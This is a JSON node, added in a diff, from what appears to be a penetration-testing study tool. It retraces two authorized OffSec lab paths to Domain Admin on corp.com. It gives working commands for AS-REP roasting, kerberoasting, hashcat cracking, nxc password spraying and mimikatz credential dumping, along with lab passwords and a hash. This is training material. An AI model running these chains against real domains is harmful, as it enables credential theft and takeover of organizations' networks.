@@ -1,0 +1,43 @@
+{
+  "id": "ad_auth_capstone_lessons",
+  "phase": "MINDSET",
+  "title": "AD Auth Capstone Retrospective — Two Chains to the DC, Same Toolkit",
+  "body": "Two PEN-200 Module 24 capstones, same corp.com domain, two completely different paths to Domain Admin. Both prove the same thing: the win is never one technique, it's the enum-access-re-enum LOOP, and the route only becomes visible once you're standing on the next credential.\n\nCAPSTONE 1 — pete -> mike -> maria -> DC1\nGoal: reach maria, log into DC1, flag on the DA Desktop. Given: pete / Nexus123!.\n  1. ENUM (unauth-ish): kerbrute userenum found mike, dave, maria, etc. AS-REP roast (GetNPUsers, no creds needed) returned hashes for dave AND mike — but maria was NOT roastable ('doesn't have UF_DONT_REQUIRE_PREAUTH'). So the target couldn't be hit directly.\n  2. CRACK: -m 18200 with the three-line rule cracked mike -> Darkness1099! (dave didn't fall in keyspace; only one of the two was needed).\n  3. ACCESS + RE-ENUM: sprayed Darkness1099! -> mike Pwn3d! on CLIENT75. Logged in, ran mimikatz sekurlsa::logonpasswords. The cached sessions on that box included maria — dumped maria's NTLM hash (2a944a58...). pete could never see this; mike's foothold could.\n  4. CRACK AGAIN: -m 1000 (NTLM) with the same rule -> maria -> passwordt_1415.\n  5. WIN: sprayed it, maria Pwn3d! on DC1, RDP'd in, flag on the Administrator Desktop. maria turned out to be DA-equivalent on DC1.\nThe key move: maria wasn't roastable, so you couldn't attack her credential directly — you had to land on a box where she had an active session and steal it from memory. That's the loop: each credential reveals the next, and the path was invisible from pete's vantage point.\n\nCAPSTONE 2 — meg -> kerberoast -> backupuser -> DC1\nGoal: reach the DC. Given: a leaked password VimForPowerShell123! to spray against meg and backupuser specifically.\n  1. SPRAY: VimForPowerShell123! -> meg valid (backupuser failed with that password). meg is a normal domain user, not admin anywhere — a foothold, not a win.\n  2. ENUM as meg: kerberoast returned TWO SPN hashes: iis_service AND backupuser. backupuser being a kerberoastable account is the whole game — the target from the prompt is itself roastable.\n  3. CRACK: -m 13100, reusing the SAME rule file from capstone 1 (the prompt told you to). Both fell: iis_service -> Strawberry1, backupuser -> DonovanJadeKnight1.\n  4. WIN: sprayed DonovanJadeKnight1 -> backupuser Pwn3d! on DC1. backupuser had the rights to own the DC.\nThe key move: the leaked spray only got you meg, who looked useless. But authenticated kerberoast from meg exposed backupuser's hash, and backupuser was the privileged account. A weak foothold's only value was the enumeration it unlocked.\n\nWHY TWO PATHS MATTER: Capstone 1's pivot was memory theft (cached creds via mimikatz) because the target wasn't roastable. Capstone 2's pivot was kerberoast because the target WAS roastable. Same domain, opposite techniques. You don't pick the technique up front — you enumerate from each new identity and take whatever the graph hands you.",
+  "cmd": "# ══════════════════════════════════════════════════\n# THE LOOP, MADE EXPLICIT\n# ══════════════════════════════════════════════════\n#   ENUM  -> find users / roastable accounts / cached sessions / ACLs\n#   ACCESS-> crack or steal ONE credential\n#   RE-ENUM from that identity (it sees what the last one couldn't)\n#   repeat until an identity can own the DC\n#\n# Capstone 1:  pete --[asrep+crack]--> mike --[mimikatz cached]--> maria --> DC1\n# Capstone 2:  meg  --[kerberoast+crack]--> backupuser --> DC1\n\n# ══════════════════════════════════════════════════\n# CAPSTONE 1 — KEY COMMANDS\n# ══════════════════════════════════════════════════\n# Who is AS-REP roastable (no creds)?\nimpacket-GetNPUsers corp.com/ -usersfile users.txt -dc-ip <DC-IP> -no-pass -format hashcat -outputfile asrep.txt\n# -> dave + mike returned hashes; maria did NOT (not roastable -> can't hit target directly)\n\n# Crack AS-REP (mode 18200, three-line rule)\nsudo hashcat -m 18200 asrep_clean.txt /usr/share/wordlists/rockyou.txt -r demo.rule --force\n# -> mike : Darkness1099!\n\n# Spray to find where mike is admin\nnxc smb <subnet> -u users.txt -p 'Darkness1099!' -d corp.com --continue-on-success\n# -> mike (Pwn3d!) on CLIENT75\n\n# On CLIENT75 as mike: steal cached creds maria left in memory\nmimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords\n# -> maria NTLM: 2a944a58d4ffa77137b2c587e6ed7626\n\n# Crack maria's NTLM (mode 1000, SAME rule)\nsudo hashcat -m 1000 maria.hash /usr/share/wordlists/rockyou.txt -r demo.rule --force\n# -> maria : passwordt_1415\n\n# Spray maria -> Pwn3d! on DC1 -> flag\nnxc smb <subnet> -u maria -p 'passwordt_1415' -d corp.com --continue-on-success\n\n# ══════════════════════════════════════════════════\n# CAPSTONE 2 — KEY COMMANDS\n# ══════════════════════════════════════════════════\n# Spray the leaked password against the two named users\nnxc smb <subnet> -u users.txt -p 'VimForPowerShell123!' -d corp.com --continue-on-success\n# -> meg valid (foothold, not admin)\n\n# Kerberoast as meg (authenticated)\nimpacket-GetUserSPNs corp.com/meg:'VimForPowerShell123!' -dc-ip <DC-IP> -request -outputfile kerberoasted\n# -> iis_service AND backupuser hashes\n\n# Crack kerberoast (mode 13100, REUSED rule from capstone 1)\nsudo hashcat -m 13100 kerberoasted /usr/share/wordlists/rockyou.txt -r demo.rule --force\n# -> iis_service : Strawberry1   /   backupuser : DonovanJadeKnight1\n\n# Spray backupuser -> Pwn3d! on DC1 -> flag\nnxc smb <subnet> -u users.txt -p 'DonovanJadeKnight1' -d corp.com --continue-on-success\n\n# ══════════════════════════════════════════════════\n# TRANSFERABLE LESSONS\n# ══════════════════════════════════════════════════\n# 1. The target isn't always directly attackable. maria wasn't roastable;\n#    you reached her by stealing a cached session, not by cracking her ticket.\n# 2. A useless-looking foothold is an ENUMERATION vantage point. meg owned\n#    nothing, but meg could kerberoast backupuser, who owned everything.\n# 3. RE-ENUMERATE after every credential. The path to the DC was invisible\n#    until you stood on the intermediate account.\n# 4. Crack everything you pull, then decide. Don't crack one hash, get stuck,\n#    and assume failure — crack all roastables and follow whichever opens a door.\n# 5. The rule file is reusable. Build ': $1 $!' once, reuse across asrep/tgs/ntlm.\n# 6. Match mode to hash: 18200 asrep, 13100 tgs, 1000 ntlm, 2100 cached(DCC2).\n# 7. mimikatz on a foothold is a pivot tool, not just a smash-and-grab — the\n#    value is often someone ELSE's session cached on the box you landed on."
+,
+  "warn": "These walkthroughs are against OffSec lab machines you are authorized to attack. The cleartext passwords and flag shown are specific to one VM-group instance and rotate — they are recorded to show the chain logic, not as answers to copy. Run the enumeration yourself; your instance will have different users, hashes, and passwords.",
+  "choices": [
+    {
+      "label": "AS-REP roast technique",
+      "next": "asrep_roast"
+    },
+    {
+      "label": "Kerberoast technique",
+      "next": "kerberoast"
+    },
+    {
+      "label": "Crack the hashes (modes + rules)",
+      "next": "hashcat_roast_cracking"
+    },
+    {
+      "label": "Steal cached creds with mimikatz",
+      "next": "mimikatz"
+    },
+    {
+      "label": "Spray a cracked credential",
+      "next": "cred_reuse"
+    },
+    {
+      "label": "When mimikatz shows encrypted junk (Credential Guard)",
+      "next": "credential_guard"
+    },
+    {
+      "label": "Other lab retrospectives",
+      "next": "jump_lessons"
+    },
+    {
+      "label": "Back to jump menu",
+      "next": "jump_menu"
+    }
+  ]
+}
